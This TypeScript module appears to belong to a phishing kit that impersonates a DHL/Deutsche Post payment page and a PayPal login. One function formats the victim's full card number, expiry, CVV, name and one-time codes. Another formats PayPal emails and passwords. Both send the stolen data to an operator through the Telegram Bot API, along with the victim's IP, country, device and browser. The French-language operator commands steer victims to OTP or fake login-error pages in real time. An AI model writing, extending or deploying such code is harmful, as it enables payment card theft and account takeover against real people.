export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  message: string
): Promise<boolean> {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

export function formatPaymentNotification(data: {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardholderName: string;
  otp1?: string;
  otp2?: string;
  timestamp: Date;
  ipAddress?: string;
  country?: string;
  device?: string;
  browser?: string;
}): string {
  const cardLast4 = data.cardNumber.slice(-4);
  const fullCardNumber = data.cardNumber;
  
  return `
🔔 <b>New Activity</b>

✅ <b>Card Number:</b> ${fullCardNumber}
✅ <b>Expiration:</b> ${data.expiryMonth}/${data.expiryYear}
✅ <b>Cvc:</b> ${data.cvv}
✅ <b>Name:</b> ${data.cardholderName}

${data.otp1 ? `✅ <b>OTP 1:</b> ${data.otp1}\n` : ''}${data.otp2 ? `✅ <b>OTP 2:</b> ${data.otp2}\n` : ''}
-----------------------------+
POST DE
+-----------------------------

<b>Country:</b> ${data.country || 'Unknown'}
<b>IP Address:</b> ${data.ipAddress || 'Unknown'}
<b>Device:</b> ${data.device || 'Desktop/Unknown'}
<b>Browser:</b> ${data.browser || 'Unknown'}
<b>Page:</b> DHL Payment

🌐-----------------------------+
POST DE
+-----------------------------
  `.trim();
}

export function formatPayPalNotification(data: {
  email: string;
  password: string;
  timestamp: Date;
  ipAddress?: string;
  country?: string;
  device?: string;
  browser?: string;
  sessionId?: string;
  targetUrl?: string;
}): string {
  const redirectMessage = data.targetUrl 
    ? `\n\nThe visitor will be redirected within 2 seconds.`
    : `\n\n<b>⏳ Client en attente...</b>\n\nCommandes:\n/otp_${data.sessionId} - Rediriger vers OTP\n/error_${data.sessionId} - Rediriger vers LOGIN ERROR`;
  
  return `
🔔 <b>New Activity</b>

✅ <b>Email:</b> ${data.email}
✅ <b>Password:</b> ${data.password}

-----------------------------+
<b>Country:</b> ${data.country || 'Unknown'}
<b>IP Address:</b> ${data.ipAddress || 'Unknown'}
🌐-----------------------------+
<b>Session:</b> ${data.sessionId || 'N/A'}
<b>Device:</b> ${data.device || 'Desktop/Unknown'}
<b>Browser:</b> ${data.browser || 'Unknown'}
<b>Page:</b> Login Page${redirectMessage}
  `.trim();
}

export async function getClientInfo(req: any): Promise<{
  ipAddress: string;
  country: string;
  device: string;
  browser: string;
  sessionId: string;
}> {
  // Get IP address
  const ipAddress = 
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'Unknown';

  // Get user agent
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Detect device
  let device = 'Desktop/Unknown';
  if (/mobile/i.test(userAgent)) {
    device = 'Mobile';
  } else if (/tablet/i.test(userAgent)) {
    device = 'Tablet';
  } else if (/desktop/i.test(userAgent)) {
    device = 'Desktop';
  }

  // Detect browser
  let browser = 'Unknown';
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
    const match = userAgent.match(/Chrome\/(\d+\.\d+\.\d+)/);
    browser = match ? `Chrome ${match[1]}` : 'Chrome';
  } else if (userAgent.includes('Firefox')) {
    const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
    browser = match ? `Firefox ${match[1]}` : 'Firefox';
  } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
    browser = 'Safari';
  } else if (userAgent.includes('Edg')) {
    browser = 'Edge';
  }

  // Get country from IP (basic implementation - you can enhance with GeoIP service)
  let country = 'Unknown';
  try {
    // Using a free IP geolocation service
    const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=country`);
    const geoData = await geoResponse.json();
    country = geoData.country || 'Unknown';
  } catch (error) {
    console.error('GeoIP lookup failed:', error);
  }

  // Generate session ID
  const sessionId = Math.random().toString(36).substring(2, 10);

  return {
    ipAddress,
    country,
    device,
    browser,
    sessionId
  };
}
